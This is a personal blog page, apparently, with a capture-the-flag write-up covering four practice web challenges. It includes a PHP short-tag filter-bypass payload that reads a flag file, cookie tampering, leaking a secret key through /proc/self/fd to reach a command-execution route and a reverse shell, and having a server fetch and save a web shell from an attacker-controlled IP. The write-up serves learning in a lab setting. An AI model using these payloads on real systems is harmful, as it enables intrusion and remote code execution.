@@ -1,0 +1,332 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF（陆） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF（陆） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="BUU
+[红明谷CTF 2021]write_shell
+审计
+&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+function check($input){
+    if(pr..." />
+    <meta name="keywords" content="日常,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF（陆）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-23
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/k_UdJm9MZ/" class="post-tag">
+                  # 日常
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-zhou-ctflu.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="buu">BUU</h1>
+<h2 id="红明谷ctf-2021write_shell">[红明谷CTF 2021]write_shell</h2>
+<p>审计</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+function check($input){
+    if(preg_match(&quot;/'| |_|php|;|~|\\^|\\+|eval|{|}/i&quot;,$input)){
+        // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){
+        die('hacker!!!');
+    }else{
+        return $input;
+    }
+}
+
+function waf($input){
+  if(is_array($input)){
+      foreach($input as $key=&gt;$output){
+          $input[$key] = waf($output);
+      }
+  }else{
+      $input = check($input);
+  }
+}
+
+$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+if(!file_exists($dir)){
+    mkdir($dir);
+}
+switch($_GET[&quot;action&quot;] ?? &quot;&quot;) {
+    case 'pwd':
+        echo $dir;
+        break;
+    case 'upload':
+        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;
+        waf($data);
+        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);
+}
+?&gt;
+</code></pre>
+<p>知识点：PHP短标签<br>
+<img src="https://skyblu3519.github.io/post-images/1690120907244.png" alt="" loading="lazy"></p>
+<p>使用反引号执行命令，<code>\t</code>绕过空格。</p>
+<p>payload</p>
+<pre><code class="language-php">/?action=upload&amp;data=&lt;?=`cat\t/flllllll1112222222lag`?&gt;
+</code></pre>
+<h2 id="watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store</h2>
+<p>查看请求头，cookie是一串b64编码，解码得到<code>{&quot;money&quot;: 50, &quot;history&quot;: []}</code>。</p>
+<p>修改money重新编码修改发送，买Flag Cookie，get shell<br>
+<img src="https://skyblu3519.github.io/post-images/1690120930042.png" alt="" loading="lazy"></p>
+<h2 id="网鼎杯-2020-白虎组picdown">[网鼎杯 2020 白虎组]PicDown</h2>
+<p>url这可以读文件<br>
+<img src="https://skyblu3519.github.io/post-images/1690120953837.png" alt="" loading="lazy"></p>
+<p>呃......<br>
+<img src="https://skyblu3519.github.io/post-images/1690120971802.png" alt="" loading="lazy"></p>
+<p>看下预期解。</p>
+<p>通过<code>/proc/self/cmdline</code>知道了启动文件<code>app.py</code>，读<code>/app/app.py</code>获得源码</p>
+<pre><code class="language-python">from flask import Flask, Response
+from flask import render_template
+from flask import request
+import os
+import urllib
+
+app = Flask(__name__)
+
+SECRET_FILE = &quot;/tmp/secret.txt&quot;
+f = open(SECRET_FILE)
+SECRET_KEY = f.read().strip()
+os.remove(SECRET_FILE)
+
+
+@app.route('/')
+def index():
+    return render_template('search.html')
+
+
+@app.route('/page')
+def page():
+    url = request.args.get(&quot;url&quot;)
+    try:
+        if not url.lower().startswith(&quot;file&quot;):
+            res = urllib.urlopen(url)
+            value = res.read()
+            response = Response(value, mimetype='application/octet-stream')
+            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
+            return response
+        else:
+            value = &quot;HACK ERROR!&quot;
+    except:
+        value = &quot;SOMETHING WRONG!&quot;
+    return render_template('search.html', res=value)
+
+
+@app.route('/no_one_know_the_manager')
+def manager():
+    key = request.args.get(&quot;key&quot;)
+    print(SECRET_KEY)
+    if key == SECRET_KEY:
+        shell = request.args.get(&quot;shell&quot;)
+        os.system(shell)
+        res = &quot;ok&quot;
+    else:
+        res = &quot;Wrong Key!&quot;
+
+    return res
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+</code></pre>
+<p><code>/proc/self/fd/</code>这个目录链接到当前进程打开的所有文件描述符，每个打开的文件都有一个以文件描述符编号命名。在<code>/proc/self/fd/3</code>找到了SECRET_KEY<br>
+<img src="https://skyblu3519.github.io/post-images/1690121008043.png" alt="" loading="lazy"></p>
+<p>然后就可以在no_one_know_the_manager中用shell参数反弹shell，读取flag。<br>
+<img src="https://skyblu3519.github.io/post-images/1690121016377.png" alt="" loading="lazy"></p>
+<h2 id="hitcon-2017ssrfme">[HITCON 2017]SSRFme</h2>
+<pre><code class="language-php">&lt;?php
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+}
+
+echo $_SERVER[&quot;REMOTE_ADDR&quot;];
+
+$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);
+@mkdir($sandbox);
+@chdir($sandbox);
+
+$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));
+$info = pathinfo($_GET[&quot;filename&quot;]);
+$dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));
+@mkdir($dir);
+@chdir($dir);
+@file_put_contents(basename($info[&quot;basename&quot;]), $data);
+highlight_file(__FILE__);
+</code></pre>
+<p>代码的逻辑是执行GET命令访问网页，然后将结果保存在输入的filename下。</p>
+<p>虽然<code>escapeshellarg</code>确保了不能执行其他命令，但是可以远程下载我们服务器上的文件。而这个保存路径我们也是知道的，文件名也是可控的。所以思路就是在自己的服务器上放个shell文件，然后通过<code>shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code>下载到目录中。</p>
+<p>流程如下，在服务器上准备好下载的shell<br>
+<img src="https://skyblu3519.github.io/post-images/1690121055131.png" alt="" loading="lazy"></p>
+<p>输入<code>url=http://IP/shell&amp;filename=/test/sky.php</code>将shell以php格式保存，执行命令get shell<br>
+<img src="https://skyblu3519.github.io/post-images/1690121063654.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-2021write_shell">[红明谷CTF 2021]write_shell</a></li>
+<li><a href="#watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store</a></li>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84picdown">[网鼎杯 2020 白虎组]PicDown</a></li>
+<li><a href="#hitcon-2017ssrfme">[HITCON 2017]SSRFme</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yizhouctf5/">
+              <h3 class="post-title">
+                一周CTF（5）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
